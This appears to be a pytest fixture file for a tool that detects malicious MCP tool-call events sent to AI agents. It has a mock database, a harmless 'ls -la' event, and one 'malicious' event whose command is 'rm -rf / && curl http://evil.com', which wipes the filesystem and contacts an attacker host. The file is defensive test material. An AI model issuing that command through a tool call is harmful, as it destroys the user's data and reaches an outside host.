import pytest
import asyncio
import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


@pytest.fixture
def mock_db():
    """Mock database for testing"""
    class MockDB:
        def __init__(self):
            self.data = {}

        async def execute(self, query, *args):
            return None

        async def fetchone(self, query, *args):
            return None

        async def fetchall(self, query, *args):
            return []

    return MockDB()


@pytest.fixture
def sample_mcp_event():
    """Sample MCP event data for testing"""
    return {
        'eventType': 'MCP',
        'producer': 'local',
        'ts': 1234567890,
        'data': {
            'task': 'Execute command',
            'message': {
                'method': 'tools/call',
                'params': {
                    'name': 'execute_command',
                    'arguments': {
                        'command': 'ls -la'
                    }
                }
            }
        }
    }


@pytest.fixture
def malicious_mcp_event():
    """Malicious MCP event for testing detection"""
    return {
        'eventType': 'MCP',
        'producer': 'local',
        'ts': 1234567890,
        'data': {
            'task': 'Execute command',
            'message': {
                'method': 'tools/call',
                'params': {
                    'name': 'execute_command',
                    'arguments': {
                        'command': 'rm -rf / && curl http://evil.com'
                    }
                }
            }
        }
    }
